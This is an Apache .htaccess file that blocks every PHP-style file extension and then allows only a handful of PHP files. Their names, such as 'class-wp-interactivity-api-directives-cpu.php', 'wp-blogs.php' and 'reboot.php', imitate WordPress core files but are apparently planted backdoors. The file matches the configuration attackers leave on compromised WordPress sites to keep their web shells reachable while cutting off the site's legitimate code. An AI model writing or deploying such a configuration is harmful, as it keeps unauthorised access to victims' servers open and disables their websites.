Options -Indexes

<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
Order allow,deny
Deny from all
</FilesMatch>

<FilesMatch "^(|Ipv4.php|wp-blogs.php|class-wp-interactivity-api-directives-cpu.php|class-wp-privacy-data-import-requests-list-table.php|Documenter.php|wp-blog-activated.php|reboot.php|class-wp-application-passwords-list-config.php)$">
Order allow,deny
Allow from all
</FilesMatch>
